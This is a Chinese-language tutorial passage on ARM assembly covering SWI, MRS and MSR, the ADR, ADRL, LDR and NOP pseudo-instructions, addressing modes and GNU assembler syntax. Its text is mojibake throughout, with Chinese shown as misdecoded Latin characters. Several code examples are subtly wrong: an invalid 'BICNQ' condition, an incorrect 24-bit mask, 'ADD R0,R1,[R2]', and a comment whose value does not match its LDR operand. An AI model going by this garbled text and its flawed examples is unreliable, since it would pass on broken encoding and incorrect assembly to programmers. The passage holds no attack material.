p7,0,R0,c1,c2,1\n1.3.5. ARM æ‚é¡¹æŒ‡ä»¤ â€‹ è¡¨A-8ç»™å‡ºå…¨éƒ¨çš„ARMåå¤„ç†å™¨æŒ‡ä»¤ã€‚\nè¡¨A-8 ARMæ‚é¡¹æŒ‡ä»¤\nSWI\nâ€‹ è½¯ä¸­æ–­æŒ‡ä»¤ã€‚SWI æŒ‡ä»¤ç”¨äºäº§ç”Ÿè½¯ä¸­æ–­ï¼Œä»è€Œå®ç°åœ¨ç”¨æˆ·æ¨¡å¼å˜æ¢åˆ°ç®¡ç†æ¨¡å¼ï¼ŒCPSRä¿å­˜åˆ°ç®¡ç†æ¨¡å¼çš„SPSRä¸­ï¼Œæ‰§è¡Œè½¬ç§»åˆ°SWI å‘é‡ï¼Œåœ¨å…¶å®ƒæ¨¡å¼ä¸‹ä¹Ÿå¯ä½¿ç”¨SWI æŒ‡ä»¤ï¼Œå¤„ç†åŒæ ·åœ°åˆ‡æ¢åˆ°ç®¡ç†æ¨¡å¼ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹  SWI{cond} immed_24 â€‹ å…¶ä¸­ï¼šimmed_24 24 ä½ç«‹å³æ•°ï¼Œå€¼ä¸º0ï½16777215 ä¹‹é—´çš„æ•´æ•°ã€‚ â€‹ SWI æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ SWI 0 ;è½¯ä¸­æ–­ï¼Œä¸­æ–­ç«‹å³æ•°ä¸º0 â€‹ SWI 0x123456 ;è½¯ä¸­æ–­ï¼Œä¸­æ–­ç«‹å³æ•°ä¸º0x123456 â€‹ ä½¿ç”¨SWI æŒ‡ä»¤æ—¶ï¼Œé€šå¸¸ä½¿ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹æ³•è¿›è¡Œä¼ é€’å‚æ•°ï¼ŒSWI å¼‚å¸¸ä¸­æ–­å¤„ç†ç¨‹åºå°±å¯ä»¥æä¾›ç›¸å…³çš„æœåŠ¡ï¼Œè¿™ä¸¤ç§æ–¹æ³•å‡æ˜¯ç”¨æˆ·è½¯ä»¶åå®šã€‚SWIå¼‚å¸¸ä¸­æ–­å¤„ç†ç¨‹åºè¦é€šè¿‡è¯»å–å¼•èµ·è½¯ä¸­æ–­çš„SWI æŒ‡ä»¤ï¼Œä»¥å–å¾—24 ä½ç«‹å³æ•°ã€‚ â€‹ ï¼ˆAï¼‰æŒ‡ä»¤24 ä½çš„ç«‹å³æ•°æŒ‡å®šäº†ç”¨æˆ·è¯·æ±‚çš„æœåŠ¡ç±»å‹ï¼Œå‚æ•°é€šè¿‡ç”¨å¯„å­˜å™¨ä¼ é€’ã€‚ â€‹ MOV R0,#34 ;è®¾ç½®äº†åŠŸèƒ½å·ä¸º34 â€‹ SWI 12 ;è°ƒç”¨12 å·è½¯ä¸­æ–­ â€‹ ï¼ˆBï¼‰æŒ‡ä»¤ä¸­çš„24 ä½ç«‹å³æ•°è¢«å¿½ç•¥ï¼Œç”¨æˆ·è¯·æ±‚çš„æœåŠ¡ç±»å‹ç”±å¯„å­˜å™¨R0 çš„å€¼å†³å®šï¼Œå‚æ•°é€šè¿‡å…¶å®ƒçš„é€šç”¨å¯„å­˜å™¨ä¼ é€’ã€‚ â€‹ MOV R0,#12 ;è°ƒç”¨12 å·è½¯ä¸­æ–­ â€‹ MOV R1,#34 ;è®¾ç½®å­åŠŸèƒ½å·ä¸º34 â€‹ SWI 0 ; â€‹ åœ¨SWI å¼‚å¸¸ä¸­æ–­å¤„ç†ç¨‹åºä¸­ï¼Œå–å‡ºSWI ç«‹å³æ•°çš„æ­¥éª¤ä¸ºï¼šé¦–å…ˆç¡®å®šå¼•èµ·è½¯ä¸­æ–­çš„SWIæŒ‡ä»¤æ˜¯ARMæŒ‡ä»¤è¿˜æ—¶Thumb æŒ‡ä»¤ï¼Œè¿™å¯é€šè¿‡å¯¹SPSR è®¿é—®å¾—åˆ°ï¼šç„¶åè¦å–å¾—è¯¥SWI æŒ‡ä»¤çš„åœ°å€ï¼Œè¿™å¯é€šè¿‡è®¿é—®LR å¯„å­˜å™¨å¾—åˆ°ï¼šæ¥ç€è¯»å‡ºæŒ‡ä»¤ï¼Œåˆ†è§£å‡ºç«‹å³æ•°ã€‚ â€‹ è¯»å‡ºSWI ç«‹å³æ•°ï¼š â€‹ T_bit EQU 0x20 â€‹ SWI_Hander â€‹ STMFD SP!,{R0_R3,R12,LR} ;ç°åœºä¿æŠ¤ â€‹ MRS R0,SPSR ;è¯»å–SPSR â€‹ STMFD SP!,{R0} ;ä¿å­˜SPSR â€‹ TST R0,#T_bit ;æµ‹è¯•Tæ ‡å¿—ä½ â€‹ LDRNEH R0,[LR,#-2] ;è‹¥æ˜¯ThumbæŒ‡ä»¤ï¼Œè¯»å–æŒ‡ä»¤ç (16 ä½) â€‹ BICNE R0,R0,#0xFF00 ;å–å¾—Thumb æŒ‡ä»¤çš„8 ä½ç«‹å³æ•° â€‹ LDREQ R0,[LR,#-4] ;è‹¥æ˜¯ARM æŒ‡ä»¤ï¼Œè¯»å–æŒ‡ä»¤ç (32 ä½) â€‹ BICNQ R0,R0,#0xFF00000 ;å–å¾—ARM æŒ‡ä»¤çš„24 ä½ç«‹å³æ•° â€‹ â€¦ â€‹ LDMFD SP!,{R0-R3,R12,PC}^ ;SWI å¼‚å¸¸ä¸­æ–­è¿”å›\nMRS â€‹ è¯»çŠ¶æ€å¯„å­˜å™¨æŒ‡ä»¤ã€‚åœ¨ARM å¤„ç†å™¨ä¸­ï¼Œåªæœ‰MRS æŒ‡ä»¤å¯ä»¥çŠ¶æ€å¯„å­˜å™¨CPSRæˆ–SPSRè¯»å‡ºåˆ°é€šç”¨å¯„å­˜å™¨ä¸­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ MRS{cond} Rd ,psr â€‹ å…¶ä¸­ï¼š Rd ç›®æ ‡å¯„å­˜å™¨ã€‚Rd ä¸å…è®¸ä¸ºR15ã€‚ â€‹ psr CPSR æˆ–SPSR â€‹ MRSæŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ MRS R1,CPSR ;å°†CPSRçŠ¶æ€å¯„å­˜å™¨è¯»å–ï¼Œä¿å­˜åˆ°R1 ä¸­ â€‹ MRS R2,SPSR ;å°†SPSRçŠ¶æ€å¯„å­˜å™¨è¯»å–ï¼Œä¿å­˜åˆ°R2 ä¸­ â€‹ MRS æŒ‡ä»¤è¯»å–CPSRï¼Œå¯ç”¨æ¥åˆ¤æ–­ALU çš„çŠ¶æ€æ ‡å¿—ï¼Œæˆ–IRQã€FIQä¸­æ–­æ˜¯å¦å…è®¸ç­‰ï¼›åœ¨å¼‚å¸¸å¤„ç†ç¨‹åºä¸­ï¼Œè¯»SPSR å¯çŸ¥é“è¿›è¡Œå¼‚å¸¸å‰çš„å¤„ç†å™¨çŠ¶æ€ç­‰ã€‚MRS ä¸MSR é…åˆä½¿ç”¨ï¼Œå®ç°CPSR æˆ–SPSR å¯„å­˜å™¨çš„è¯»â€”ä¿®æ”¹---å†™æ“ä½œï¼Œå¯ç”¨æ¥è¿›è¡Œå¤„ç†å™¨æ¨¡å¼åˆ‡æ¢()ï¼Œå…è®¸/ç¦æ­¢IRQ/FIQä¸­æ–­ç­‰è®¾ç½®ã€‚å¦å¤–ï¼Œè¿›ç¨‹åˆ‡æ¢æˆ–å…è®¸å¼‚å¸¸ä¸­æ–­åµŒå¥—æ—¶ï¼Œä¹Ÿéœ€è¦ä½¿ç”¨MRS æŒ‡ä»¤è¯»å–SPSR çŠ¶æ€å€¼ã€‚ä¿å­˜èµ·æ¥ã€‚ â€‹ ä½¿èƒ½IRQ ä¸­æ–­ä¾‹ç¨‹ï¼š â€‹ ENABLE_IRQ â€‹ MRS R0,CPSR â€‹ BIC R0ã€‚R0,#0x80 â€‹ MSR CPSR_c,R0 â€‹ MOV PC,LR â€‹ ç¦èƒ½IRQ ä¸­æ–­ä¾‹ç¨‹ï¼š â€‹ DISABLE_IRQ â€‹ MRS R0,CPSR â€‹ ORR R0,R0,#0x80 â€‹ MSR CPSR_c,R0 â€‹ MOV PC,LR\nMSR â€‹ å†™çŠ¶æ€å¯„å­˜å™¨æŒ‡ä»¤ã€‚åœ¨ARM å¤„ç†å™¨ä¸­ã€‚åªæœ‰MSR æŒ‡ä»¤å¯ä»¥ç›´æ¥è®¾ç½®çŠ¶æ€å¯„å­˜å™¨CPSRæˆ–SPSRã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ MSR{cond} psr_fields,#immed_8r â€‹ MSR{cond} psr_fields,Rm â€‹ å…¶ä¸­ï¼š psr CPSR æˆ–SPSR â€‹ fields æŒ‡å®šä¼ é€çš„åŒºåŸŸã€‚Fields å¯ä»¥æ˜¯ä»¥ä¸‹çš„ä¸€ç§æˆ–å¤šç§(å­—æ¯å¿…é¡»ä¸ºå°å†™)ï¼š â€‹ c æ§åˆ¶åŸŸå±è”½å­—èŠ‚(psr[7â€¦0]) â€‹ x æ‰©å±•åŸŸå±è”½å­—èŠ‚(psr[15â€¦8]) â€‹ s çŠ¶æ€åŸŸå±è”½å­—èŠ‚(psr[23ã€‚â€¦16]) â€‹ f æ ‡å¿—åŸŸå±è”½å­—èŠ‚(psr[31â€¦24]) â€‹ immed_8r è¦ä¼ é€åˆ°çŠ¶æ€å¯„å­˜å™¨æŒ‡å®šåŸŸçš„ç«‹å³æ•°ï¼Œ8 ä½ã€‚ â€‹ Rm è¦ä¼ é€åˆ°çŠ¶æ€å¯„å­˜å™¨æŒ‡å®šåŸŸçš„æ•°æ®çš„æºå¯„å­˜å™¨ã€‚ â€‹ MSR æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ MSR CPSR_c,#0xD3 ;CPSR[7â€¦0]=0xD3ï¼Œå³åˆ‡æ¢åˆ°ç®¡ç†æ¨¡å¼ã€‚ â€‹ MSR CPSR_cxsf,R3 ;CPSR=R3 â€‹ åªæœ‰åœ¨ç‰¹æƒæ¨¡å¼ä¸‹æ‰èƒ½ä¿®æ”¹çŠ¶æ€å¯„å­˜å™¨ã€‚ â€‹ ç¨‹åºä¸­ä¸èƒ½é€šè¿‡MSR æŒ‡ä»¤ç›´æ¥ä¿®æ”¹CPSR ä¸­çš„T æ§åˆ¶ä½æ¥å®ç°ARM çŠ¶æ€/ThumbçŠ¶æ€çš„åˆ‡æ¢ï¼Œå¿…é¡»ä½¿ç”¨BX æŒ‡ä»¤å®Œæˆå¤„ç†å™¨çŠ¶æ€çš„åˆ‡æ¢(å› ä¸ºBX æŒ‡ä»¤å±è½¬ç§»æŒ‡ä»¤ï¼Œå®ƒä¼šæ‰“æ–­æµæ°´çº¿çŠ¶æ€ï¼Œå®ç°å¤„ç†å™¨çŠ¶æ€åˆ‡æ¢)ã€‚MRS ä¸MSR é…åˆä½¿ç”¨ï¼Œå®ç°CPSRæˆ–SPSR å¯„å­˜å™¨çš„è¯»-ä¿®æ”¹-å†™æ“ä½œï¼Œå¯ç”¨æ¥è¿›è¡Œå¤„ç†å™¨æ¨¡å¼åˆ‡æ¢ã€å…è®¸/ç¦æ­¢IRQ/FIQ ä¸­æ–­ç­‰è®¾ç½®ã€‚ â€‹ å †æ ˆæŒ‡ä»¤å®å§‹åŒ–ä¾‹ç¨‹ï¼š â€‹ INITSTACK â€‹ MOV R0,LR ;ä¿å­˜è¿”å›åœ°å€ â€‹ ;è®¾ç½®ç®¡ç†æ¨¡å¼å †æ ˆ â€‹ MSR CPSR_c,#0xD3 â€‹ LDR SP,StackSvc â€‹ ;è®¾ç½®ä¸­æ–­æ¨¡å¼å †æ ˆ â€‹ MSR CPSR_c,#0xD2 â€‹ LDR SP,StackIrq â€‹ â€¦\n1.3.6. ARM ä¼ªæŒ‡ä»¤ â€‹ ARM ä¼ªæŒ‡ä»¤ä¸æ˜¯ARM æŒ‡ä»¤é›†ä¸­çš„æŒ‡ä»¤ï¼Œåªæ˜¯ä¸ºäº†ç¼–ç¨‹æ–¹ä¾¿ç¼–è¯‘å™¨å®šä¹‰äº†ä¼ªæŒ‡ä»¤ï¼Œä½¿ç”¨æ—¶å¯ä»¥åƒå…¶å®ƒARM æŒ‡ä»¤ä¸€æ ·ä½¿ç”¨ï¼Œä½†åœ¨ç¼–è¯‘æ—¶è¿™äº›æŒ‡ä»¤å°†è¢«ç­‰æ•ˆçš„ARM æŒ‡ä»¤ä»£æ›¿ã€‚ARMä¼ªæŒ‡ä»¤æœ‰å››æ¡ï¼Œåˆ†åˆ«ä¸ºADR ä¼ªæŒ‡ä»¤ã€ADRL ä¼ªæŒ‡ä»¤ã€LDR ä¼ªæŒ‡ä»¤å’ŒNOP ä¼ªæŒ‡ä»¤ã€‚\nADR â€‹ å°èŒƒå›´çš„åœ°å€è¯»å–ä¼ªæŒ‡ä»¤ã€‚ADR æŒ‡ä»¤å°†åŸºäºPC ç›¸å¯¹åç§»çš„åœ°å€å€¼è¯»å–åˆ°å¯„å­˜å™¨ä¸­ã€‚åœ¨æ±‡ç¼–ç¼–è¯‘æºç¨‹åºæ—¶ï¼ŒADRä¼ªæŒ‡ä»¤è¢«ç¼–è¯‘å™¨æ›¿æ¢æˆä¸€æ¡åˆé€‚çš„æŒ‡ä»¤ã€‚é€šå¸¸ï¼Œç¼–è¯‘å™¨ç”¨ä¸€æ¡ADD æŒ‡ä»¤æˆ–SUB æŒ‡ä»¤æ¥å®ç°è¯¥ADR ä¼ªæŒ‡ä»¤çš„åŠŸèƒ½ï¼Œè‹¥ä¸èƒ½ç”¨ä¸€æ¡æŒ‡ä»¤å®ç°ï¼Œåˆ™äº§ç”Ÿé”™è¯¯ï¼Œç¼–è¯‘å¤±è´¥ã€‚ â€‹ ADR ä¼ªæŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹  ADR{cond} register,exper â€‹ å…¶ä¸­ï¼šregister åŠ è½½çš„ç›®æ ‡å¯„å­˜å™¨ã€‚ â€‹ exper åœ°å€è¡¨è¾¾å¼ã€‚å½“åœ°å€å€¼æ˜¯éå­—åœ°é½æ—¶ï¼Œå–å€¼èŒƒå›´-255ï½255 å­—èŠ‚ä¹‹é—´ï¼›å½“åœ°å€æ˜¯å­—å¯¹é½æ—¶ï¼Œå–å€¼èŒƒå›´-1020ï½1020å­—èŠ‚ä¹‹é—´ã€‚ â€‹ å¯¹äºåŸºäºPC ç›¸å¯¹åç§»çš„åœ°å€å€¼æ—¶ï¼Œç»™å®šèŒƒå›´æ˜¯ç›¸å¯¹å½“å‰æŒ‡ä»¤åœ°å€åä¸¤ä¸ªå­—å¤„(å› ä¸ºARM7TDMIä¸ºä¸‰çº§æµæ°´çº¿)ã€‚ â€‹ ADR ä¼ªæŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ LOOP MOV R1, #0xF0 â€‹ â€¦ â€‹ ADR R2, LOOP ;å°†LOOP çš„åœ°å€æ”¾å…¥R2 â€‹ ADR R3, LOOP+4 â€‹ å¯ä»¥ç”¨ADR åŠ è½½åœ°å€ï¼Œå®ç°æŸ¥è¡¨ï¼š â€‹ â€¦ â€‹ ADR R0,DISP_TAB ;åŠ è½½è½¬æ¢è¡¨åœ°å€ â€‹ LDRB R1,[R0,R2] ;ä½¿ç”¨R2ä½œä¸ºå‚æ•°ï¼Œè¿›è¡ŒæŸ¥è¡¨ â€‹ â€¦ â€‹ DISP_TAB â€‹ DCB0Xc0,0xF9,0xA4,0xB0,0x99,0x92,0x82,0xF8,0x80,0x90\nADRL â€‹ ä¸­ç­‰èŒƒå›´çš„åœ°å€è¯»å–ä¼ªæŒ‡ä»¤ã€‚ADRL æŒ‡ä»¤å°†åŸºäºPC ç›¸å¯¹åç§»çš„åœ°å€å€¼æˆ–åŸºäºå¯„å­˜å™¨ç›¸å¯¹åç§»çš„åœ°å€å€¼è¯»å–åˆ°å¯„å­˜å™¨ä¸­ï¼Œæ¯”ADRä¼ªæŒ‡ä»¤å¯ä»¥è¯»å–æ›´å¤§èŒƒå›´çš„åœ°å€ã€‚åœ¨æ±‡ç¼–ç¼–è¯‘æºç¨‹åºæ—¶ï¼ŒADRL ä¼ªæŒ‡ä»¤è¢«ç¼–è¯‘å™¨æ›¿æ¢æˆä¸¤ä¸ªæ¡åˆé€‚çš„æŒ‡ä»¤ã€‚è‹¥ä¸èƒ½ç”¨ä¸¤æ¡æŒ‡ä»¤å®ç°ADRL ä¼ªæŒ‡ä»¤åŠŸèƒ½ï¼Œåˆ™äº§ç”Ÿé”™è¯¯ï¼Œç¼–è¯‘å¤±è´¥ã€‚ADRLä¼ªæŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ ADR{cond} register,exper â€‹ å…¶ä¸­ï¼šregister åŠ è½½çš„ç›®æ ‡å¯„å­˜å™¨ã€‚ â€‹ expr åœ°å€è¡¨è¾¾å¼ã€‚å½“åœ°å€å€¼æ˜¯éå­—å¯¹é½æ—¶ï¼Œå–èŒƒå›´-64Kï½64K å­—èŠ‚ä¹‹é—´ï¼›å½“åœ°å€å€¼æ˜¯å­—å¯¹é½æ—¶ï¼Œå–å€¼èŒƒå›´-256Kï½256Kå­—èŠ‚ä¹‹é—´ã€‚ â€‹ ADRL ä¼ªæŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ ADRL R0,DATA_BUF â€‹ â€¦ â€‹ ADRL R1 DATA_BUF+80 â€‹ â€¦ â€‹ DATA_BUF â€‹ SPACE 100 ;å®šä¹‰100 å­—èŠ‚ç¼“å†²åŒº â€‹ å¯ä»¥ä¸”ç”¨ADRL åŠ è½½åœ°å€ï¼Œå®ç°ç¨‹åºè·³è½¬ï¼Œä¸­ç­‰èŒƒå›´åœ°å€çš„åŠ è½½ï¼š â€‹ â€¦ â€‹ ADR LR,RETURNI ;è®¾ç½®è¿”å›åœ°å€ â€‹ ADRL R1Thumb_Sub+1 ;å–å¾—äº†Thumb å­ç¨‹åºå…¥å£åœ°å€ï¼Œä¸”R1 çš„0 ä½ç½®1 â€‹ BX R1 ;è°ƒç”¨Thumbå­ç¨‹åºï¼Œå¹¶åˆ‡æ¢å¤„ç†å™¨çŠ¶æ€ â€‹ RETURNI â€‹ â€¦ â€‹ CODE16 â€‹ Thumb_Sub â€‹ MOV R1,#10 â€‹ â€¦\nLDR â€‹ å¤§èŒƒå›´çš„åœ°å€è¯»å–ä¼ªæŒ‡ä»¤ã€‚LDR ä¼ªæŒ‡ä»¤ç”¨äºåŠ è½½32 ä½çš„ç«‹å³æ•°æˆ–ä¸€ä¸ªåœ°å€å€¼åˆ°æŒ‡å®šå¯„å­˜å™¨ã€‚åœ¨æ±‡ç¼–ç¼–è¯‘æºç¨‹åºæ—¶ï¼ŒLDRä¼ªæŒ‡ä»¤è¢«ç¼–è¯‘å™¨æ›¿æ¢æˆä¸€æ¡åˆé€‚çš„æŒ‡ä»¤ã€‚è‹¥åŠ è½½çš„å¸¸æ•°æœªè¶…å‡ºMOV æˆ–MVN çš„èŒƒå›´ï¼Œåˆ™ä½¿ç”¨MOV æˆ–MVN æŒ‡ä»¤ä»£æ›¿è¯¥LDR ä¼ªæŒ‡ä»¤ï¼Œå¦åˆ™æ±‡ç¼–å™¨å°†å¸¸é‡æ”¾å…¥å­—æ± ï¼Œå¹¶ä½¿ç”¨ä¸€æ¡ç¨‹åºç›¸å¯¹åç§»çš„LDRæŒ‡ä»¤ä»æ–‡å­—æ± è¯»å‡ºå¸¸é‡ã€‚LDR ä¼ªæŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ LDR{cond} register,=expr/label_expr â€‹ å…¶ä¸­ï¼šregister åŠ è½½çš„ç›®æ ‡å¯„å­˜å™¨ â€‹ expr 32 ä½ç«‹å³æ•°ã€‚ â€‹ label_expr åŸºäºPC çš„åœ°å€è¡¨è¾¾å¼æˆ–å¤–éƒ¨è¡¨è¾¾å¼ã€‚ â€‹ LADR ä¼ªæŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼šã€‚ â€‹ LDR R0,=0x123456 ;åŠ è½½32 ä½ç«‹å³æ•°0x12345678 â€‹ LDR R0,=DATA_BUF+60 ;åŠ è½½DATA_BUF åœ°å€+60 â€‹ â€¦ â€‹ LTORG ;å£°æ˜æ–‡å­—æ±  â€‹ ä¼ªæŒ‡ä»¤LDR å¸¸ç”¨äºåŠ è½½èŠ¯ç‰‡å¤–å›´åŠŸèƒ½éƒ¨ä»¶çš„å¯„å­˜å™¨åœ°å€(32 ä½ç«‹å³æ•°)ï¼Œä»¥å®ç°å„ç§æ§åˆ¶æ“ä½œåŠ è½½32ä½ç«‹å³æ•°ï¼š â€‹ â€¦ â€‹ LDR R0,=IOPIN ;åŠ è½½GPIO å¯„å­˜å™¨IOPIN çš„åœ°å€ â€‹ LDR R1,[R0] ;è¯»å–IOPIN å¯„å­˜å™¨çš„å€¼ â€‹ â€¦ â€‹ LDR R0,=IOSET â€‹ LDR R1,=0x00500500 â€‹ STR R1,[R0] ;IOSET=0x00500500 â€‹ â€¦ â€‹ ä»PC åˆ°æ–‡å­—æ± çš„åç§»é‡å¿…é¡»å°äº4KBã€‚ä¸ARM æŒ‡ä»¤çš„LDR ç›¸æ¯”ï¼Œä¼ªæŒ‡ä»¤çš„LDRçš„å‚æ•°æœ‰â€œ=â€å·\nNOP â€‹ ç©ºæ“ä½œä¼ªæŒ‡ä»¤ã€‚NOP ä¼ªæŒ‡ä»¤åœ¨æ±‡ç¼–æ—¶å°†ä¼šè¢«ä»£æ›¿æˆARM ä¸­çš„ç©ºæ“ä½œï¼Œæ¯”å¦‚å¯èƒ½ä¸ºâ€œMOV R0, R0â€æŒ‡ä»¤ç­‰ï¼ŒNOP ä¼ªæŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ NOP â€‹ NOP â€‹ NOP â€‹ NOP â€‹ SUBS R1, R1, #1 â€‹ BNE DELAY1 â€‹ â€¦\n1.4. å¯»å€æ–¹å¼ 1.4.1. ç«‹å³æ•°å¯»å€ ç«‹å³æ•°å‰é¢æœ‰â€œ#â€å·ï¼Œå¹¶ä¸”å¦‚æœæ˜¯åå…­è¿›åˆ¶æ•°åˆ™åœ¨â€œ#â€åæ·»åŠ â€œ0xâ€æˆ–â€œ\u0026â€ï¼ŒäºŒè¿›åˆ¶æ•°â€œ#â€åé¢åŠ â€œ%â€ã€‚\n1.4.2. å¯„å­˜å™¨å¯»å€ 1.4.3. å¯„å­˜å™¨é—´æ¥å¯»å€ ä»¥å¯„å­˜å™¨ä¸­çš„å€¼ä½œä¸ºæ“ä½œæ•°çš„åœ°å€ï¼Œè€Œæ“ä½œæ•°æœ¬èº«æ”¾åœ¨å­˜å‚¨å™¨ä¸­ã€‚\nä¾‹å¦‚ï¼š\nADD R0ï¼ŒR1ï¼Œ[R2] 1.4.4. åŸºå€å˜å€å¯»å€ å°†å¯„å­˜å™¨çš„å†…å®¹ä¸æŒ‡ä»¤ä¸­ç»™å‡ºçš„åœ°å€åç§»é‡ç›¸åŠ ï¼Œä»è€Œå¾—åˆ°ä¸€ä¸ªæ“ä½œæ•°çš„æœ‰æ•ˆåœ°å€ã€‚\nä¾‹å¦‚ï¼šLDR R0ï¼Œ[R1ï¼Œ#4] R0\u003c-[R1+4]\n1.4.5. å¤šå¯„å­˜å™¨å¯»å€ ä¸€æ¡æŒ‡ä»¤å¯ä»¥å®Œæˆå¤šä¸ªå¯„å­˜å™¨å€¼å¾—ä¼ é€’ï¼Œä¸€æ¡æŒ‡ä»¤ä¼ é€æœ€å¤š16ä¸ªé€šç”¨å¯„å­˜å™¨çš„å€¼ã€‚\nLDMIA R0ï¼Œ{R1ï¼ŒR2ï¼ŒR3ï¼ŒR4}\n1.4.6. ç›¸å¯¹å¯»å€ ä»¥ç¨‹åºè®¡æ•°å™¨PCçš„å€¼ä½œä¸ºåŸºåœ°å€ï¼ŒæŒ‡ä»¤ä¸­çš„åœ°å€æ ‡å·ä½œä¸ºåç§»é‡ï¼Œå°†ä¸¤è€…ç›¸åŠ åå¾—åˆ°çš„æ“ä½œæ•°çš„æœ‰æ•ˆåœ°å€ã€‚\nä¾‹å¦‚ï¼šBL NEXT;\n1.4.7. å †æ ˆå¯»å€ ä½¿ç”¨ä¸€ä¸ªå †æ ˆæŒ‡é’ˆçš„ä¸“ç”¨å¯„å­˜å™¨æŒ‡ç¤ºå½“å‰æ“ä½œä½ç½®\né€’å¢å †æ ˆï¼šå‘é«˜åœ°å€æ–¹å‘ç”Ÿé•¿\né€’å‡å †æ ˆï¼šå‘ä½åœ°å€æ–¹å‘ç”Ÿé•¿\næ»¡å †æ ˆï¼šå †æ ˆæŒ‡é’ˆæŒ‡å‘æœ€åå‹å…¥å †æ ˆçš„æœ‰æ•ˆæ•°æ®\nç©ºå †æ ˆï¼šå †æ ˆæŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªè¦æ”¾å…¥æ•°æ®çš„ç©ºä½ç½®\n2. GNU ARMæ··ç¼– â€‹ æ±‡ç¼–æºç¨‹åºä¸€èˆ¬ç”¨äºç³»ç»Ÿæœ€åŸºæœ¬çš„åˆå§‹åŒ–ï¼šåˆå§‹åŒ–å †æ ˆæŒ‡é’ˆã€è®¾ç½®é¡µè¡¨ã€æ“ä½œ ARMçš„åå¤„ç†å™¨ç­‰ã€‚è¿™äº›åˆå§‹åŒ–å·¥ä½œå®Œæˆåå°±å¯ä»¥è·³è½¬åˆ°Cä»£ç mainå‡½æ•°ä¸­æ‰§è¡Œã€‚\n1.1. GNUæ±‡ç¼–è¯­è¨€è¯­å¥æ ¼å¼ â€‹ ä»»ä½•Linuxæ±‡ç¼–è¡Œéƒ½æ˜¯å¦‚ä¸‹ç»“æ„ï¼š[:][} @comment\nl instructionä¸ºæŒ‡ä»¤\nl directiveä¸ºä¼ªæ“ä½œ\nl pseudo-instructionä¸ºä¼ªæŒ‡ä»¤\nl **:**ä¸ºæ ‡å·, GNUæ±‡ç¼–ä¸­ï¼Œä»»ä½•ä»¥å†’å·ç»“å°¾çš„æ ‡è¯†ç¬¦éƒ½è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªæ ‡å·ï¼Œè€Œä¸ä¸€å®šéè¦åœ¨ä¸€è¡Œçš„å¼€å§‹ã€‚\nl commentä¸ºè¯­å¥çš„æ³¨é‡Š\nä¸‹é¢å®šä¹‰ä¸€ä¸ª\"add\"çš„å‡½æ•°ï¼Œæœ€ç»ˆè¿”å›ä¸¤ä¸ªå‚æ•°çš„å’Œï¼š\n.section.text, â€œxâ€\n.globaladd @ give the symbol â€œaddâ€ externallinkage\nadd:\nâ€‹ ADD r0, r0, r1 @ add input arguments\nâ€‹ MOV pc, lr @ return from subroutine\n@ endof program\næ³¨æ„ï¼š\nl ARMæŒ‡ä»¤ï¼Œä¼ªæŒ‡ä»¤ï¼Œä¼ªæ“ä½œï¼Œå¯„å­˜å™¨åå¯ä»¥å…¨éƒ¨ä¸ºå¤§å†™å­—æ¯ï¼Œä¹Ÿå¯å…¨éƒ¨ä¸ºå°å†™å­—æ¯ï¼Œä½†ä¸å¯å¤§å°å†™æ··ç”¨ã€‚\nl å¦‚æœè¯­å¥å¤ªé•¿ï¼Œå¯ä»¥å°†ä¸€æ¡è¯­å¥åˆ†å‡ è¡Œæ¥ä¹¦å†™ï¼Œåœ¨è¡Œæœ«ç”¨â€œ\\â€è¡¨ç¤ºæ¢è¡Œï¼ˆå³ä¸‹ä¸€è¡Œä¸æœ¬è¡Œä¸ºåŒä¸€è¯­å¥ï¼‰ã€‚â€œ\\â€åä¸èƒ½æœ‰ä»»ä½•å­—ç¬¦ï¼ŒåŒ…å«ç©ºæ ¼å’Œåˆ¶è¡¨ç¬¦ï¼ˆTab)ã€‚\n1.2. GNUæ±‡ç¼–ç¨‹åºä¸­çš„æ ‡å·symbolï¼ˆæˆ–labelï¼‰ â€‹ æ ‡å·åªèƒ½ç”±aï½zï¼ŒAï½Zï¼Œ0ï½9ï¼Œâ€œ.â€ï¼Œ_ç­‰ï¼ˆç”±ç‚¹ã€å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ç­‰ç»„æˆï¼Œé™¤å±€éƒ¨æ ‡å·å¤–ï¼Œä¸èƒ½ä»¥æ•°å­—å¼€å¤´ï¼‰å­—ç¬¦ç»„æˆã€‚\nSymbolçš„æœ¬è´¨ï¼šä»£è¡¨å®ƒæ‰€åœ¨çš„åœ°å€,å› æ­¤ä¹Ÿå¯ä»¥å½“ä½œå˜é‡æˆ–è€…å‡½æ•°æ¥ä½¿ç”¨ã€‚\nl æ®µå†…æ ‡å·çš„åœ°å€å€¼åœ¨æ±‡ç¼–æ—¶ç¡®å®šï¼›\nl æ®µå¤–æ ‡å·çš„åœ°å€å€¼åœ¨è¿æ¥æ—¶ç¡®å®šã€‚\nSymbolçš„åˆ†ç±»ï¼š3ç±»ï¼ˆä¾æ®æ ‡å·çš„ç”Ÿæˆæ–¹å¼ï¼‰ã€‚\n\u003c1\u003e åŸºäºPCçš„æ ‡å·ã€‚åŸºäºPCçš„æ ‡å·æ˜¯ä½äºç›®æ ‡æŒ‡ä»¤å‰çš„æ ‡å·æˆ–è€…ç¨‹åºä¸­æ•°æ®å®šä¹‰ä¼ªæ“ä½œå‰çš„æ ‡å·ã€‚è¿™ç§æ ‡å·åœ¨æ±‡ç¼–æ—¶å°†è¢«å¤„ç†æˆPCå€¼åŠ 